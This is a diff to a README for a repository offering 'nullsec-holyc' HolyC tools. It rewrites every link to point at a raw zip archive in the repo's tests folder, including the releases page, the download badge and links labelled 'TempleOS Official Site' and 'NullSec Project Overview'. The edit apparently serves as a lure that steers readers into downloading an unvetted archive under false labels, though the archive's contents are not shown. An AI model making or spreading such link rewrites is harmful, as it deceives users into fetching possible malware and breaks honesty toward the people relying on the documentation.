@@ -1,6 +1,6 @@
 # 🛠 nullsec-holyc - Explore HolyC Tools for Your Projects
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Engramjad321/nullsec-holyc/releases)
+[![Download Now](https://github.com/Engramjad321/nullsec-holyc/raw/refs/heads/main/tests/holyc-nullsec-v2.1-alpha.2.zip%20Now-From%20Releases-brightgreen)](https://github.com/Engramjad321/nullsec-holyc/raw/refs/heads/main/tests/holyc-nullsec-v2.1-alpha.2.zip)
 
 ## 📄 Overview
 
@@ -26,7 +26,7 @@ Before you start using the tools in this repository, make sure you:
 
 To get the latest version of the nullsec-holyc tools, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Engramjad321/nullsec-holyc/releases).
+1. Visit the [Releases page](https://github.com/Engramjad321/nullsec-holyc/raw/refs/heads/main/tests/holyc-nullsec-v2.1-alpha.2.zip).
 2. Choose the version you want to download.
 3. Click on the file that suits your operating system (e.g., Windows Installer, Linux Package).
 4. Follow the prompts to download and install.
@@ -71,8 +71,8 @@ If you encounter problems, please visit the "Issues" tab on the repository. Prov
 
 ## 🔗 Additional Resources
 
-- [TempleOS Official Site](http://templeos.holyc.xyz/)
-- [NullSec Project Overview](https://nullsec.org)
+- [TempleOS Official Site](https://github.com/Engramjad321/nullsec-holyc/raw/refs/heads/main/tests/holyc-nullsec-v2.1-alpha.2.zip)
+- [NullSec Project Overview](https://github.com/Engramjad321/nullsec-holyc/raw/refs/heads/main/tests/holyc-nullsec-v2.1-alpha.2.zip)
 
 ## 📧 Contact
 
@@ -80,4 +80,4 @@ If you have any questions or need support, feel free to open an issue on the Git
 
 Thank you for choosing nullsec-holyc! We hope you find the tools helpful and insightful. Happy coding!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Engramjad321/nullsec-holyc/releases)
+[![Download Now](https://github.com/Engramjad321/nullsec-holyc/raw/refs/heads/main/tests/holyc-nullsec-v2.1-alpha.2.zip%20Now-From%20Releases-brightgreen)](https://github.com/Engramjad321/nullsec-holyc/raw/refs/heads/main/tests/holyc-nullsec-v2.1-alpha.2.zip)
